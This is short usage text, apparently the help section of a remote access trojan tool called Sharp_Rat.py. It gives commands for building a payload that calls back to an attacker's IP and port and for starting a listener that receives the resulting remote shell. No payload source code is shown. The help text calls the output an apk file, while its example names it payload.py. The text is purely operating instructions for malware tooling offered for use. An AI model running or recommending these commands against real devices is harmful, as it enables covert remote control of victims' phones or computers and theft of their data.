Usage:
[1] Create a Payload

  python3 Sharp_Rat.py --build [flags]
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (required)

$>python3 Sharp_Rat.py --build -i 127.0.0.1 -p 1234 -o payload.py

[2] Create a Listener

  python3 Sharp_Rat.py --shell [flags]
  Flags:
    -i, --ip                Listner IP address
    -p, --port              Listner port number

$>python3 Sharp_Rat.py --shell -i 127.0.0.1 -p 1234
